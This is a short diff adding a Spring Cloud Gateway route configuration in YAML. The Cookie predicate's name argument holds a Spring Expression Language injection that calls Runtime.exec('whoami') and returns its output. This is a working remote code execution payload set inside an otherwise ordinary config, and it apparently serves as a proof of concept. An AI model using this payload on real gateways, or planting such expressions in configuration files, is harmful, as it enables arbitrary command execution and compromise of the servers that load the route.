@@ -1,0 +1,11 @@
+spring:
+  cloud:
+    gateway:
+      routes:
+        - id: after_route
+          uri: https://example.org
+          predicates:
+            - name: Cookie
+              args:
+                name: "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).next()}"
+                regexp: mycookievalue
